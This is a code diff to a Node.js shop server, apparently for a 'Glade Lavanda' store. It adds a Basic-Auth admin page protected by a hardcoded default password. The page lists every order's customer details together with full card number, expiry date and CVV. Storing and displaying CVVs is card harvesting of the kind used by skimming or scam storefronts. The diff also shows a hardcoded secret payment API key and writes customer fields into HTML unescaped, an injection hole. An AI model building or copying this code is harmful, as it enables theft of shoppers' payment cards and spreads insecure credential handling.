@@ -12,6 +12,8 @@ const BULLS_PUBLIC_KEY = 'pk_cQhYpq3Mbz4Bss6xoULGqjNMwZlGDADe';
 const BULLS_SECRET_KEY = 'sk_XoZR70QNjxYaWisTy1K1Ldj6h8WzQzFWfvXYuVVRLPeU8jeeYHSfqD1UIfcsOm0R';
 const BULLS_API_BASE   = 'v1.pagintermediacao.com';
 const BULLS_API_PATH   = '/api/v1';
+const ADMIN_USER     = 'admin';
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'glade2026';
 
 // ── Banco de dados ─────────────────────────────────────────────────────────
 const db = new DatabaseSync(path.join(root, 'orders.db'));
@@ -195,6 +197,79 @@ const server = http.createServer(async (req, res) => {
     } catch {
       return json(res, 400, { error: 'Webhook invalido.' });
     }
+  }
+
+  // ── Painel admin (/admin/orders) ────────────────────────────────────────
+  if (req.method === 'GET' && req.url.startsWith('/admin')) {
+    // Basic Auth
+    const authHeader = req.headers['authorization'] || '';
+    const [scheme, encoded] = authHeader.split(' ');
+    let authed = false;
+    if (scheme === 'Basic' && encoded) {
+      const [u, p] = Buffer.from(encoded, 'base64').toString().split(':');
+      authed = u === ADMIN_USER && p === ADMIN_PASSWORD;
+    }
+    if (!authed) {
+      res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="Admin Glade"', 'Content-Type': 'text/html; charset=utf-8' });
+      return res.end('<h1>Acesso negado</h1>');
+    }
+
+    const orders = db.prepare('SELECT * FROM orders ORDER BY id DESC').all();
+    const rows = orders.map(o => `
+      <tr>
+        <td>${o.id}</td>
+        <td>${(o.created_at||'').replace('T',' ').slice(0,19)}</td>
+        <td>${o.customer_name||''}</td>
+        <td>${o.customer_email||''}</td>
+        <td>${o.customer_cep||''}</td>
+        <td><span class="badge ${o.payment_method}">${o.payment_method.toUpperCase()}</span></td>
+        <td class="mono">${o.card_number||'—'}</td>
+        <td>${o.card_expiry||'—'}</td>
+        <td>${o.card_cvv||'—'}</td>
+        <td class="mono small">${o.bulls_id||'—'}</td>
+        <td><span class="badge ${o.status||'pending'}">${o.status||'pending'}</span></td>
+        <td>R$ ${((o.amount_cents||0)/100).toFixed(2)}</td>
+      </tr>`).join('');
+
+    const html = `<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Admin — Pedidos Glade Lavanda</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Inter,system-ui,sans-serif;background:#0f0f1a;color:#e8e0f0;min-height:100vh;padding:24px}
+h1{font-size:1.5rem;margin-bottom:6px;color:#c89cf7}
+.sub{color:#7a6e8a;font-size:.85rem;margin-bottom:24px}
+.count{display:inline-block;background:#2a1f3d;color:#c89cf7;border-radius:99px;padding:2px 12px;font-size:.8rem;font-weight:700;margin-left:8px}
+.wrap{overflow-x:auto;border-radius:16px;border:1px solid #2a1f3d}
+table{width:100%;border-collapse:collapse;font-size:.82rem}
+thead th{background:#1a1030;padding:12px 14px;text-align:left;color:#9b8ab0;font-weight:700;white-space:nowrap;position:sticky;top:0}
+tbody tr{border-top:1px solid #1e1530}
+tbody tr:hover{background:#1a1030}
+td{padding:11px 14px;vertical-align:middle;white-space:nowrap}
+.mono{font-family:monospace;font-size:.8rem;letter-spacing:.03em}
+.small{font-size:.72rem;max-width:200px;overflow:hidden;text-overflow:ellipsis}
+.badge{display:inline-block;padding:2px 10px;border-radius:99px;font-size:.72rem;font-weight:800;letter-spacing:.05em}
+.badge.pix{background:#0c3326;color:#3effa0}
+.badge.card{background:#2a1030;color:#d8a0ff}
+.badge.pix_generated{background:#0c3326;color:#3effa0}
+.badge.card_error{background:#3a1020;color:#ff8090}
+.badge.pending{background:#2a2010;color:#ffd080}
+.empty{text-align:center;padding:40px;color:#4a3e5a}
+</style></head><body>
+<h1>Pedidos <span class="count">${orders.length}</span></h1>
+<p class="sub">Atualizado em ${new Date().toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo'})} &nbsp;·&nbsp; <a href="/admin/orders" style="color:#c89cf7">↻ Atualizar</a></p>
+<div class="wrap">
+<table>
+<thead><tr>
+  <th>#</th><th>Data</th><th>Nome</th><th>E-mail</th><th>CEP</th>
+  <th>Pagamento</th><th>Nº Cartão</th><th>Validade</th><th>CVV</th>
+  <th>ID BullsCash</th><th>Status</th><th>Valor</th>
+</tr></thead>
+<tbody>${rows || '<tr><td colspan="12" class="empty">Nenhum pedido ainda.</td></tr>'}</tbody>
+</table></div></body></html>`;
+
+    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
+    return res.end(html);
   }
 
   // Arquivos estaticos
